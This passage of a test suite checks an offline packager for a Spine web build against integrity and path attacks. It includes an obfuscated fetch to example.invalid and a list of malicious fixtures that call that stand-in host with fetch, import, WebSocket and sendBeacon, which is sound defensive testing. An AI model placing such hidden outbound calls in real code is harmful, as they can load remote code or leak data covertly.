        SPINE_OFFLINE_LAUNCHER_DIR: launcherDirectory,
        SPINE_OFFLINE_REPLACE_PATH: targetPath,
        SPINE_OFFLINE_REPLACEMENT: replacement.toString("utf8"),
      },
      stdio: "pipe",
    });

    expect(readFileSync(targetPath)).toEqual(replacement);
    const zip = await JSZip.loadAsync(readFileSync(archive));
    expect(await zip.file("Start-Offline.ps1")!.async("nodebuffer")).toEqual(safeContents);
  });

  it.each(["3_5", "3_6", "3_7", "4_3"])("拒绝 Spine %s Runtime chunk 的单字节篡改", (version) => {
    const tamperedBuild = mkdtempSync(join(tmpdir(), `spine-offline-tampered-${version}-`));
    temporaryDirectories.push(tamperedBuild);
    cpSync(verifiedBuildDirectory, tamperedBuild, { recursive: true });
    const path = runtimePath(tamperedBuild, version);
    writeFileSync(path, Buffer.concat([readFileSync(path), Buffer.from(" ")]));

    expect(() => packageFixture(tamperedBuild, join(tamperedBuild, "offline.zip")))
      .toThrow(/Runtime.*SHA-256/);
  });

  it.each(["3_5", "3_6", "3_7", "3_8", "4_0", "4_1", "4_2", "4_3"])(
    "拒绝 Spine %s 预期同名 Runtime chunk 被干净 JavaScript 替换",
    (version) => {
      const directory = makeOfflineBuild();
      writeFileSync(runtimePath(directory, version), "export {};\n");

      expect(() => packageFixture(directory, join(directory, "offline.zip")))
        .toThrow(/Runtime.*SHA-256/);
    },
  );

  it("拒绝缺失任一预期 Runtime entry", () => {
    const directory = makeOfflineBuild();
    rmSync(runtimePath(directory, "3_8"));

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime 文件集合/);
  });

  it("即使启发式审计未识别混淆外联，也拒绝替换后的同名 Runtime", () => {
    const directory = makeOfflineBuild();
    writeFileSync(runtimePath(directory, "4_3"), [
      'const member = ["fe", "tch"].join("");',
      "globalThis[member](String.fromCharCode(104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100));",
    ].join("\n"));

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime.*SHA-256/);
  });

  it("拒绝精确 helper path 的内容被替换", () => {
    const directory = makeOfflineBuild();
    const helperPath = builtAssetPath(directory, /^runtime-factory-.*\.js$/);
    writeFileSync(helperPath, "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime.*SHA-256/);
  });

  it("拒绝符号链接，即使目标是安全的普通文件", () => {
    const directory = makeOfflineBuild();
    const targetPath = join(directory, "assets/safe-target.js");
    const linkPath = builtAssetPath(directory, /^index-.*\.js$/);
    writeFileSync(targetPath, 'export const target = "safe";\n');
    rmSync(linkPath);
    symlinkSync("safe-target.js", linkPath);

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/普通文件|符号链接/);
  });

  it("拒绝指向构建根外的嵌套目录符号链接", () => {
    const directory = makeOfflineBuild();
    const outsideDirectory = mkdtempSync(join(tmpdir(), "spine-offline-outside-directory-"));
    temporaryDirectories.push(outsideDirectory);
    writeFileSync(join(outsideDirectory, "outside.js"), 'export const outside = "not packaged";\n');
    symlinkSync(outsideDirectory, join(directory, "assets/nested-link"), "dir");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/普通文件|符号链接|目录/);
  });

  it("目录读取后被同名普通目录替换时按 identity fail-closed", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-directory-race-"));
    const replacementDirectory = mkdtempSync(join(tmpdir(), "spine-offline-directory-replacement-"));
    temporaryDirectories.push(archiveDirectory, replacementDirectory);
    const targetDirectory = join(directory, "assets/nested");
    mkdirSync(targetDirectory);
    writeFileSync(join(targetDirectory, "same-name.js"), 'export const value = "original";\n');
    writeFileSync(join(replacementDirectory, "same-name.js"), 'export const value = "replacement";\n');
    const moduleUrl = pathToFileURL(script).href;

    expect(() => execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { rename } from "node:fs/promises";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  afterDirectoryRead: async (directory) => {",
      "    if (directory !== process.env.SPINE_OFFLINE_REPLACE_DIRECTORY) return;",
      '    await rename(directory, `${directory}-original`);',
      "    await rename(process.env.SPINE_OFFLINE_DIRECTORY_SOURCE, directory);",
      "  },",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: join(archiveDirectory, "offline.zip"),
        SPINE_OFFLINE_REPLACE_DIRECTORY: targetDirectory,
        SPINE_OFFLINE_DIRECTORY_SOURCE: replacementDirectory,
      },
      stdio: "pipe",
    })).toThrow(/目录.*替换|目录.*identity|枚举与读取/);
  });

  it.each([
    ["反斜杠", "assets/helper\\runtime-5_0-a.js"],
    ["控制字符", "assets/control-\u0001.js"],
    ["全角 Unicode", "assets/ｒuntime-5_0-a.js"],
    ["dotless Unicode", "assets/runtıme-5_0-a.js"],
    ["后缀 token", "assets/helper-runtime-5_0-a.js"],
    ["下划线 token", "assets/helper_runtime_xhm.js"],
  ])("拒绝非规范路径或隐藏 Runtime 候选：%s", (_label, archivePath) => {
    const directory = makeOfflineBuild();
    const path = join(directory, archivePath);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/归档路径|Runtime 文件集合/);
  });

  it.each([
    ["尾随点", "assets/index.js."],
    ["尾随空格", "assets/index.js "],
    ["小于号", "assets/invalid<name.js"],
    ["大于号", "assets/invalid>name.js"],
    ["冒号", "assets/invalid:name.js"],
    ["双引号", 'assets/invalid"name.js'],
    ["竖线", "assets/invalid|name.js"],
    ["问号", "assets/invalid?name.js"],
    ["星号", "assets/invalid*name.js"],
    ["CON 扩展名", "assets/CON.js"],
    ["PRN", "assets/prn"],
    ["AUX 扩展名", "assets/AUX.css"],
    ["NUL 扩展名", "assets/nul.txt"],
    ["COM1 扩展名", "assets/COM1.json"],
    ["LPT9 扩展名", "assets/lpt9.js"],
  ])("拒绝 Windows 不安全 archive path：%s", (_label, archivePath) => {
    const directory = makeOfflineBuild();
    const path = join(directory, archivePath);
    writeFileSync(path, "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/归档路径|Windows|设备名/);
  });

  it("拒绝 Windows 大小写不敏感 archive path 碰撞", () => {
    const directory = makeOfflineBuild();
    const main = builtAssetPath(directory, /^index-.*\.js$/);
    writeFileSync(join(directory, "assets", main.split("/").at(-1)!.toUpperCase()), "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/碰撞/);
  });

  it("拒绝两个构建文件映射到同一 archive path", () => {
    const directory = makeOfflineBuild();
    writeFileSync(join(directory, "index.html"), readFileSync(join(directory, "offline/index.html")));

    expect(() => packageFixture(directory, join(directory, "duplicate.zip")))
      .toThrow(/重复归档路径/);
  });

  it("完整 manifest 拒绝启发式无法识别的主 chunk 计算式外联", () => {
    const directory = makeOfflineBuild();
    const mainPath = builtAssetPath(directory, /^index-.*\.js$/);
    const mutation = [
      'const member = ["fe", "tch"].join("");',
      "globalThis[member](String.fromCharCode(104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100));",
    ].join("\n");
    expect(externalRuntimeDependencies("assets/calculated.js", mutation)).toEqual([]);
    writeFileSync(mainPath, mutation);

    expect(() => packageFixture(directory, join(directory, "calculated.zip")))
      .toThrow(/离线完整资产 manifest.*SHA-256/);
  });

  it("大写脚本扩展名仍接受网络能力审计", () => {
    const directory = makeOfflineBuild();
    writeFileSync(join(directory, "assets/NETWORK.JS"), 'fetch("https://example.invalid/upper");\n');

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/远程运行依赖|完整资产 manifest/);
  });

  it("快照后磁盘替换不会改变已审计并写入 ZIP 的 bytes", async () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-snapshot-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");
    const targetPath = builtAssetPath(directory, /^index-.*\.js$/);
    const safeContents = readFileSync(targetPath, "utf8");
    const replacement = [
      'const member = ["fe", "tch"].join("");',
      "globalThis[member](String.fromCharCode(104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100));",
    ].join("\n");
    const moduleUrl = pathToFileURL(script).href;

    execFileSync(process.execPath, ["--input-type=module", "--eval", [
      'import { writeFile } from "node:fs/promises";',
      `const { packageOffline } = await import(${JSON.stringify(moduleUrl)});`,
      "await packageOffline({",
      "  outputDirectory: process.env.SPINE_OFFLINE_DIST_DIR,",
      "  outputArchive: process.env.SPINE_OFFLINE_ARCHIVE,",
      "  skipBuild: true,",
      "  afterSnapshot: () => writeFile(process.env.SPINE_OFFLINE_REPLACE_PATH, process.env.SPINE_OFFLINE_REPLACEMENT),",
      "});",
    ].join("\n")], {
      cwd: repositoryRoot,
      env: {
        ...process.env,
        SPINE_OFFLINE_DIST_DIR: directory,
        SPINE_OFFLINE_ARCHIVE: archive,
        SPINE_OFFLINE_REPLACE_PATH: targetPath,
        SPINE_OFFLINE_REPLACEMENT: replacement,
        SPINE_OFFLINE_SKIP_BUILD: "1",
      },
      stdio: "pipe",
    });

    expect(readFileSync(targetPath, "utf8")).toBe(replacement);
    const zip = await JSZip.loadAsync(readFileSync(archive));
    const archivePath = targetPath.slice(directory.length + 1).replaceAll("\\", "/");
    expect(await zip.file(archivePath)!.async("string")).toBe(safeContents);
  });

  it.each([
    ["未来主版本", "assets/runtime-5_0-a.js"],
    ["双位次版本", "assets/runtime-3_10-a.js"],
    ["禁止格式", "assets/runtime-xhm-a.js"],
    ["嵌套 entry", "assets/nested/runtime-3_5-a.js"],
    ["Runtime 命名目录", "assets/runtime-shadow/chunk.js"],
    ["伪装 helper", "assets/runtime-factory-copy.js"],
    ["无分隔后缀", "assets/helper-runtime.js"],
    ["点分隔", "assets/vendor.runtime.js"],
    ["裸文件名", "assets/runtime.js"],
  ])("拒绝额外 Runtime 候选：%s", (_label, archivePath) => {
    const directory = makeOfflineBuild();
    const path = join(directory, archivePath);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime 文件集合/);
  });

  it("拒绝所有受支持载体中的外部运行网络目标", () => {
    const maliciousBuilds = [
      { js: 'fetch("https://example.invalid/data");' },
      { js: 'const xhr = new XMLHttpRequest(); xhr.open("GET", "https://example.invalid/data");' },
      { js: 'new Worker("https://example.invalid/worker.js");' },
      { js: 'const workerUrl = "https://example.invalid/worker.js"; new Worker(workerUrl);' },
      { js: 'importScripts("https://example.invalid/worker.js");' },
      { js: 'import("https://example.invalid/module.js");' },
      { js: 'fetch("https:\\u002f\\u002fexample.invalid/escaped-fetch");' },
      { js: 'import("https:\\x2f\\u{2f}example.invalid/escaped-import.js");' },
      { js: 'new EventSource("//example.invalid/events");' },
      { js: 'new WebSocket("wss://example.invalid/socket");' },
      { css: "body { background-image: url(//cdn.example.invalid/background.png); }" },
      { css: "body { background-image: url(https:\\2f \\2f cdn.example.invalid/escaped-background.png); }" },
      { css: String.raw`body { background-image: url(https:\/\/cdn.example.invalid/escaped-character-background.png); }` },
      { html: '<script src="https://example.invalid/app.js"></script>' },
      { html: '<script src="https:&#47;&#47;example.invalid/escaped-app.js"></script>' },
      { html: '<script src="https:&sol;&sol;example.invalid/named-entity-app.js"></script>' },
      { html: "<script src=https://example.invalid/unquoted-app.js></script>" },
      { html: "<a href=//example.invalid/unquoted-link>外部链接</a>" },
      { html: "<script src=https:&#47;&#47;example.invalid/unquoted-entity.js></script>" },
      { html: '<img src="https:&NewLine;//example.invalid/entity-newline.png">' },
      { html: "<img src=https:&#10;//example.invalid/numeric-newline.png>" },
      { html: '<img src="https://example.invalid/first.png" src="./ignored-safe.png">' },
      { html: '<button formaction="https://example.invalid/submit">提交</button>' },
      { html: '<video poster="https://example.invalid/poster.png"></video>' },
      { html: '<object data="https://example.invalid/document.pdf"></object>' },
      { html: '<div style="background:url(https://example.invalid/background.png)"></div>' },
      { html: '<style>@import "https://example.invalid/theme.css";</style>' },
      { html: '<script type="text/javascript1.5">fetch(getEndpoint())</script>' },
      { html: '<script type="text/x-unknown-script">fetch(getEndpoint())</script>' },
      { html: '<script>fetch("https://example.invalid/inline-script");</script>' },
      { js: "fetch(`https:\\u002f\\u002fexample.invalid/template-fetch`);" },
      { js: "import(`https:\\x2f\\u{2f}example.invalid/template-import.js`);" },
      { js: "const xhr = new XMLHttpRequest(); xhr.open(`GET`, `https://example.invalid/template-xhr`);" },
      { js: "fetch(`https://${host}/dynamic-fetch`);" },
      { js: "import(`./${specifier}`);" },
      { js: 'const u = "./local.json"; fetch(u);' },
      { js: "const u = `./${specifier}`; import(u);" },
      { js: "const u = makeUrl(); new WebSocket(u);" },
      { js: "const u = `/events/${channel}`; new EventSource(u);" },
      { js: 'new Worker(new URL("./worker.js", "https://example.invalid/base/"));' },
      { js: 'new SharedWorker(new URL("./worker.js", getBase()));' },
      { js: 'window.navigator.sendBeacon(getEndpoint(), "payload");' },
      { js: "(0, fetch)(getEndpoint());" },
      { js: "fetch.call(globalThis, getEndpoint());" },
      { js: "const request = globalThis.fetch; request(getEndpoint());" },
      { js: 'const endpoint = "https://example.invalid/not-called";' },
      { html: '<script type="module">const u = `./${name}`; fetch(u)</script>' },
    ];

    for (const [index, overrides] of maliciousBuilds.entries()) {
      const directory = makeOfflineBuild();
      const [kind, contents] = Object.entries(overrides)[0];
      writeFileSync(join(directory, `audit-probe-${index}.${kind}`), contents);
      try {
        packageFixtureThroughSemanticAudit(directory, join(directory, "offline.zip"));
      } catch (error) {
        expect(error).toMatchObject({ message: expect.stringMatching(/远程运行依赖/) });
        continue;
      }
      throw new Error(`恶意 fixture ${index} 未被拒绝`);
    }
  });

  it("允许 blob、data、相对资源和中文文本", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-allowed-"));
    temporaryDirectories.push(archiveDirectory);

    expect(() => packageFixture(directory, join(archiveDirectory, "offline.zip"))).not.toThrow();
  });
});
